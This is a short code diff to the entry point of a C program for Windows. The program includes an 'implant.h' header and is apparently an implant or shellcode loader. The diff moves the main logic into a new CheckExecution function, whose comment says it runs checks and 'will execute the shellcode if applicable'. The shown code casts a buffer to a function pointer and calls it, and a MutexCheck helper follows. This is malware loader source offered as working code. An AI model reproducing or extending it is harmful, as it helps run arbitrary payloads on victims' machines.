@@ -1,12 +1,34 @@
 #include "implant.h"
 #include "config.h"
 
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   WinMain
+//   Entrypoint
+//
+//////////////////////////////////////////////////////////////////////////////////
+
 int APIENTRY WinMain(_In_ HINSTANCE hInst,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_ LPTSTR    lpCmdLine,
 	_In_ int       nCmdShow) {
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(lpCmdLine);
+
+	CheckExecution();
+	ExitProcess((UINT)NULL);
+}
+
+
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   CheckExecution
+//   The main function; it performs the various checks and actions
+//   and will execute the shellcode if applicable
+//
+//////////////////////////////////////////////////////////////////////////////////
+
+void CheckExecution() {
 
 	char *buffer;
 	void(*shellcodefunction)();
@@ -20,8 +42,8 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 		shellcodefunction();
 	}
 
-	ExitProcess((UINT)NULL);
 }
+
 
 //////////////////////////////////////////////////////////////////////////////////
 //
@@ -30,7 +52,6 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 //   or TRUE if we can carry on
 //
 //////////////////////////////////////////////////////////////////////////////////
-
 unsigned int MutexCheck(const char *name) {
 	HANDLE mutex = NULL, error = NULL;
 
